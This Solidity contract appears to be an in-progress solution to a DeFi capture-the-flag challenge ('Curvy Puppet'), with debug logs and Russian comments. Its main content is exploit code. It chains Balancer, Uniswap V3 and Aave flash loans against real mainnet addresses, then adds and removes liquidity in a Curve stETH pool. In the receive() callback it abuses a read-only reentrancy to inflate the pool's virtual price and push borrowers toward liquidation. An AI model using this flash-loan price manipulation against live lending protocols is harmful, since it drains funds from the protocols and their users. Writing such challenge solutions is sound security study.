// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IStableSwap} from "./IStableSwap.sol";
import {CurvyPuppetLending} from "./CurvyPuppetLending.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IVault, IFlashLoanRecipient, IERC20} from "node_modules/@balancer-labs/v2-interfaces/contracts/vault/IVault.sol";

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";


import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
//import "@aave/protocol-v2/contracts/interfaces/IAAVE.sol";
//import "@aave/protocol-v2/contracts/interfaces/IFlashLoanReceiver.sol";

interface IAAVE{
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    )  external ;
}

contract MyBalancerFlashLoan is IFlashLoanRecipient{
    IVault public vault;
    IStableSwap public pool;
    CurvyPuppetLending public lending;
    IERC20 public weth;
    address public owner;

    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);

    IUniswapV3Pool public immutable uniswap = IUniswapV3Pool(0xCBCdF9626bC03E24f779434178A73a0B4bad62eD);

    IUniswapV2Pair public immutable uniswap2 = IUniswapV2Pair(0x4028DAAC072e492d34a3Afdbef0ba7e35D8b55C4);

    //(0xCBCdF9626bC03E24f779434178A73a0B4bad62eD);
    // weth token 1


    address alice;
    address bob;
    address charlie;

    bool flag = false;
    bool remove = false;


    error NotEnough(uint256);
    error NotEnoughToRepayLoan(uint256,uint256);
    error Debt(uint256);


    constructor(address _vault, address _pool, address _lending, IERC20 _weth, address _alice, address _bob, address _charlie) {
        vault = IVault(_vault);
        pool = IStableSwap(_pool);


        lending = CurvyPuppetLending(_lending);
        weth = _weth;
        owner = msg.sender;

        alice = _alice;
        bob = _bob;
        charlie = _charlie;

        stETH.approve(address(pool), type(uint256).max);

    }

    function askFlashLoan(
        address[] memory tokens,  
        uint256[] memory amounts,
        uint256[] memory interestRateModes
    ) public {
        //WETH(payable(address(weth))).withdraw(weth.balanceOf(address(this)));
        //console.log('ethB at the start', address(this).balance/10e18);
        IAAVE aave = IAAVE(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
        aave.flashLoan(address(this), tokens, amounts, interestRateModes, address(this), "", 0);
    }

    function  executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    )  external returns (bool) {
        WETH(payable(address(weth))).withdraw(weth.balanceOf(address(this)));
        console.log('ethB after', address(this).balance/10e18);
        console.log('stEthB after', stETH.balanceOf(address(this)));

        console.log("HERE?");        

        uint256[2] memory _min_amounts;
        _min_amounts[0] = 0;
        _min_amounts[1] = 0;

        uint256 ethB = address(this).balance;
        uint256 stEthB = stETH.balanceOf(address(this));
        uint256[2] memory amounts_;
        amounts_[0] = ethB;
        amounts_[1] = stEthB;
        stETH.approve(address(pool), type(uint256).max);
        pool.add_liquidity{value: amounts_[0]}(amounts_, 0); // дает мне 55000
        console.log('Lp token', IERC20(pool.lp_token()).totalSupply()/10e17, IERC20(pool.lp_token()).balanceOf(address(this))/10e17);


        console.log('ethB at the end', address(this).balance);
        console.log('stEthB at the end', stETH.balanceOf(address(this)));
        
        
        remove = true;
        pool.remove_liquidity(IERC20(pool.lp_token()).balanceOf(address(this)) - (3 * 10e17), _min_amounts);
        return true;
    }

    // Функция для начала флеш-кредита
    function initiateFlashLoan(
        IERC20[] memory tokens,  
        uint256[] memory amounts 
    ) external {
        bytes memory userData = "";
        vault.flashLoan(this, tokens, amounts, userData);
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        require(msg.sender == address(vault), "Caller must be the Vault");
        uniswap.flash(address(this),0, weth.balanceOf(address(uniswap)),"");
      
    
        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 totalDebt = amounts[i] + feeAmounts[i];
            if(tokens[i].balanceOf(address(this)) < totalDebt){
                revert NotEnoughToRepayLoan(tokens[i].balanceOf(address(this)), totalDebt);
            }
            tokens[i].transfer(address(vault), totalDebt);
        }
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes memory data
    ) external {
        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = (address(weth));
        amounts[0] = 80000 ether;
        uint256[] memory interestRateModes = new uint256[](1);
        interestRateModes[0] = 0;
        askFlashLoan(tokens, amounts, interestRateModes);
       
       
       
        /*WETH(payable(address(weth))).withdraw(weth.balanceOf(address(this)));
        console.log('Lp token total', IERC20(pool.lp_token()).totalSupply()/10e17,  IERC20(pool.lp_token()).balanceOf(address(this))/10e17);
        console.log('ethB at the start', address(this).balance/10e18);
        console.log('stEthB at the start', stETH.balanceOf(address(this))/10e16);
        console.log('fee0', fee0);
        console.log('fee1', fee1);


        //uint256 ethB = address(this).balance / 2;
        //pool.exchange{value: ethB }(0, 1, ethB, 0);
        uint256 ethB = address(this).balance;
        uint256 stEthB = stETH.balanceOf(address(this));
        uint256[2] memory amounts_;
        amounts_[0] =address(this).balance;// ethB;
        amounts_[1] = stEthB;
        stETH.approve(address(pool), type(uint256).max);
        pool.add_liquidity{value: amounts_[0]}(amounts_, 0); // дает мне 55000
        console.log('ethB at the end', address(this).balance);
        console.log('stEthB at the end', stETH.balanceOf(address(this)));
        console.log('Lp token total', IERC20(pool.lp_token()).totalSupply()/10e17, IERC20(pool.lp_token()).balanceOf(address(this))/10e17);


        uint256[2] memory _min_amounts;
        _min_amounts[0] = 0;
        _min_amounts[1] = 0;

        remove = true;
        pool.remove_liquidity(IERC20(pool.lp_token()).balanceOf(address(this)) - (3 * 10e17), _min_amounts);

        //remove = true;

        //1096912422408349989

        //amounts_[0] = amounts_[0];
       // amounts_[1] = amounts_[1]/2;

        //pool.remove_liquidity_imbalance(amounts_, type(uint256).max);
    
        if(lending.getCollateralValue(USER_INITIAL_COLLATERAL_BALANCE) * 100 > lending.getBorrowValue(USER_BORROW_AMOUNT) * 175){
            revert NotEnough(pool.get_virtual_price());
        }*/
    }

    
    function getTokens(address token, address recipient) public {
        IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));
    } 


    receive() external payable {
        if(remove){
            console.log('ethB at the end_3', address(this).balance/10e18);
            console.log('stEthB at the end_3', stETH.balanceOf(address(this)));
            console.log('Lp token', IERC20(pool.lp_token()).totalSupply()/10e17, IERC20(pool.lp_token()).balanceOf(address(this))/10e17);
            console.log('pool.get_virtual_price()', pool.get_virtual_price());

            //IERC20(pool.lp_token()).approve(address(lending), 1 ether);
            //lending.liquidate(alice);

            if(lending.getCollateralValue(USER_INITIAL_COLLATERAL_BALANCE) * 100 >= lending.getBorrowValue(USER_BORROW_AMOUNT) * 175){
                console.log('HERE');
                revert NotEnough(pool.get_virtual_price());
            }

        }
    }

    fallback() external payable {
    }
}
